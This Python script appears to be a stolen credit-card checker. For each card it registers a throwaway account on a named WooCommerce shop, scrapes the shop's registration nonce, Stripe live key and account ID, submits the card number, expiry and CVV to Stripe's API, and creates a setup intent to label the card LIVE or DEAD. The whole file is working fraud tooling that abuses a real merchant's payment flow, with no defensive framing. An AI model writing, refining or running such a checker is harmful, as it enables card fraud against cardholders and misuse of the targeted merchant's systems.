#!/usr/bin/env python3
import requests
import re
import random
import string
import sys
import json
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def check(card):
    s = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    
    try:
        cc, mm, yy, cv = card.split('|')
        if len(yy) == 2:
            yy = '20' + yy
        
        em = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
        
        headers = {
            'user-agent': UA,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        # Get nonce
        nc = None
        for attempt in range(3):
            try:
                r1 = s.get('https://redbluechair.com/my-account/', headers=headers, timeout=15)
                nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
                if nonce_match:
                    nc = nonce_match.group(1)
                    break
            except:
                time.sleep(1)
        
        if not nc:
            return {"status": "DEAD", "msg": "Failed to get nonce"}

        # Register
        register_data = {
            'email': em,
            'password': 'Pass123!',
            'woocommerce-register-nonce': nc,
            'register': 'Register'
        }
        s.post('https://redbluechair.com/my-account/', headers=headers, data=register_data, timeout=15)

        # Get payment page
        r2 = s.get('https://redbluechair.com/my-account/add-payment-method/', headers=headers, timeout=15)

        # Extract Stripe data
        sn_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', r2.text)
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r2.text)
        at_match = re.search(r'acct_[a-zA-Z0-9]+', r2.text)

        if not all([sn_match, pk_match, at_match]):
            return {"status": "DEAD", "msg": "Failed to extract Stripe data"}

        sn = sn_match.group(1)
        pk = pk_match.group(0)
        at = at_match.group(0)

        # Create payment method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': UA
        }
        
        payment_data = (
            f'billing_details[name]=+&billing_details[email]={em.replace("@", "%40")}'
            f'&billing_details[address][country]=US&billing_details[address][postal_code]=10080'
            f'&type=card&card[number]={cc}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F350609fece'
            f'&key={pk}&_stripe_account={at}'
        )
        
        r3 = s.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=payment_data, timeout=15)
        pm_data = r3.json()
        
        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown Stripe error')
            return {"status": "DEAD", "msg": error_msg}

        # Create setup intent
        setup_data = {
            'action': 'create_setup_intent',
            'wcpay-payment-method': pm_data['id'],
            '_ajax_nonce': sn
        }
        
        ajax_headers = headers.copy()
        ajax_headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        ajax_headers['x-requested-with'] = 'XMLHttpRequest'
        
        r4 = s.post(
            'https://redbluechair.com/wp-admin/admin-ajax.php',
            headers=ajax_headers,
            data=setup_data,
            timeout=15
        )
        
        result = r4.json()
        
        # Check result
        result_str = json.dumps(result).lower()
        
        if 'error' in result_str:
            error_msg = result.get('data', {}).get('error', {}).get('message', 'Declined')
            return {"status": "DEAD", "msg": error_msg}
        elif 'success' in result_str or 'succeeded' in result_str or 'requires_action' in result_str:
            return {"status": "LIVE", "msg": "Setup Intent Created"}
        else:
            return {"status": "DEAD", "msg": "Unknown response"}
            
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card provided"}))
        sys.exit(1)
    
    card = sys.argv[1]
    result = check(card)
    print(json.dumps(result))
